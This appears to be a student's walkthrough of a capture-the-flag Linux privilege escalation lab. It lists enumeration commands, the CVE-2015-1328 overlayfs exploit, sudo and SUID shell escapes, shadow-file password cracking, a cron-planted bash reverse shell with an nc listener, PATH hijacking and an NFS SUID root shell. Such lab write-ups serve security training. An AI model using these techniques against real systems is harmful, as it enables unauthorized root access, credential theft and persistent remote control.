# Linux Priviledge Escalation Room

## TASK 3
This task highlighted some commonly used commands for Linux to help guide you into who you are, what connectivity from this device is, and what to look for as possible vulnerability.
- ```uname -a ```
- ``` hostname  ```
- ```cat /proc/version```
- ```cat /etc/issue```
- ```ps -A ``` or ```ps axjf```
- ```sudo -l```
- ```cat /etc/passwd```
- ```ifconfig```
- ```netstat -at```
- ```find /home -name flag1.txt```  or ``` find / -type f -perm 0777 ```
    - ``` find / -perm -u=s -type f 2>/dev/null ``` allows you to find SUID bit files, which allows us to run the file with a higher privilege level than the current user.


## TASK 5
In the room for the Linux Exploitation Task 5, you'll need to use the HackBox to create a new file called `ofs.c` with the contents of the `CVE-2015-1328.c` in it. This is based on the content of the exploit here https://www.exploit-db.com/exploits/37292. Spin up a python3 server by executing: 
    ``` python3 -m http.server 9000```
Then from the target computer, you'll use wget to download the ofs.c file and compile it using the command:
    ```gcc ofs.c -o ofs```
This should result in you opening a shell that results in you being root


## TASK 6
 
For this task the new box needs to be spun up so that there's a box that has the name `LinPrivEscSUDO`. TO start answering questions you'll need to first execute the command to find out which services the current user has the ability to run without password the sudo command. In this case I ran
    ```sudo -l```
From here it lisited the number of services that is the answer to the first question on this task. I was able to go to the site that's referenced in the dialague for this task [GTFOBins](https://gtfobins.github.io/) and search for each of the services listed to see which one would allow us to escalate into a shell that is root privileges. This case I used the command
     ``` sudo find . -exec /bin/sh \;``` 
which started a root session and from there able to cat the flag2.txt file for the answer to the second question. For the third question, using [GTFOBins](https://gtfobins.github.io/) searched for the sudo use of nmap and used the command I found there for the correct answer. Last question took a little bit of searching for how to accomplish the goal, but what I learned was that ```cat /etc/passwd``` allowed me to see that despite frank not having a home directory, frank did have a password hash stored in /etc/shadow. Pretty cool details for how to interpret that file found on this [site](https://takahideiwai.github.io/Cryptography/01-passwordcracking/index.html)


## TASK 7
This task is similar to the one above, but we need to deal with the set user id (SUID) and set group id (SGID) concepts. Using the command:
    ```find / -type f -perm -04000 -ls 2>/dev/null```
we are able to find out which services you can actually run as the owner of those services. The use of [GTFOBins] is still relevant here to list which services have SUID exploits. This section also includes the steps for using the /etc/shadow and /etc/passwd files to list valuable information. Steps are as follows:

- Create outputs of both files by running ```nano passwd.txt ``` and  ```nano shadow.txt``` and copy the contents of the ```base64 "$LFILE" | base64 --decode``` command for each while replacing the LFILE variable with which file you need to read.
- Use the unshadow tool to export to a file with ```unshadow passwd.txt shadow.txt > passwords.txt```
- Execute John the Ripper with a wordlist that will print out password in plain text ```john passwords.txt --wordlists /usr/share/wordlists/rockyou.txt``` if executing from the AttackBox. Then 

The Alternative path was to add the new user hash to the /etc/passwd file with root permissions. This could be done by using the ```openssl passwd -1 -salt ``` command and adding ```:/root:/bin/bash``` permission. This second route only works if you have the ability to sudo into root and adding edit permissions on the /etc/passwd file. 

## TASK 8
This task looks at the capabilities of the binaries on the box. using the command ```getcap -r / 2>/dev/null``` was able to answer the first three questions of this section. The additional binary that was found on the box for me was a service called view. In this case to take advantange of the capabilities I used the command
    ```/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'```
This started a shell that would be started as root and I'd be able to print the contents of the flag file.

## TASK 9
I used the ```cat /etc/crontab``` command to find the list of all the chron jobs across the system. Finding the file that my user owns, I modify that file by adding the command:
    ```bash -i >&/dev/tcp/1{IP}/9000 >&1```
Once you verify that the backup.sh file has +x permissions on it, you should be ready to set up the listener on the AttackBox:
    ```nc -lnvp 9000```
The reverse shell should show up and the flag is fairly straight forward to find from there. To get Matt's password we need some of the previous skills from previous tasks to help us out. Since we're already running as root, we should be able to dump the /etc/passwd and /etc/shadow files so that we can run John the Ripper on the AttackBox to crack the code.

## TASK 10
In this task had the opportunity to use path exploits. First step was creating a C file that setuid(0) and setgid(0). 
    ```c
    #include<unistd.h>
            void main(){
                setuid(0);
                setgid(0);
                system("thm");
            }
    ```
I needed to compile this first by using th ```gcc path_exp.c -o path -w``` command before spinning up a python server ```python3 -m http.server 9000 ``` and using wget to download it to the target. Next finding paths that were writeable by using ```find  -writeable 2>/dev/null``` found an interesting path that I had access to write to. In that path is where I downloaded the compiled path file for execution and made sure it had permissions to be executed. Executing the ./test file to see if my the thm script worked, it prints out the flag contents.

## TASK 11
find the mounts from the attackbox by executing ```showmounts -e {IP}``` and then make a directory on the attackbox to mount the share drives from the target to. ```mount -o rw {IP}:/home/backup /tmp/backuptarget``` In that directory created a file that executed a ```system("/bin/bash");``` in a c file and compiled it with gcc. Doing a ```chmod +s ``` on the compiled file that was made you can note that this file is owned by root. and once executing the ./nfs file, the shell transitions from being my initial user to root.

## CAPSTONE

Found some new capabilities after starting a reverse shell using perl.
/usr/bin/newgidmap = cap_setgid+ep
useage: newgidmap <pid> <uid> <lowergid> <count>
/usr/bin/newuidmap = cap_setuid+ep
useage: newuidmap <pid> <uid> <loweruid> <count>

found the pid for my current shell and lets see what happens 3114 or 2494

## Helpful things

pdftotext private.pdf -upw PASSWORD

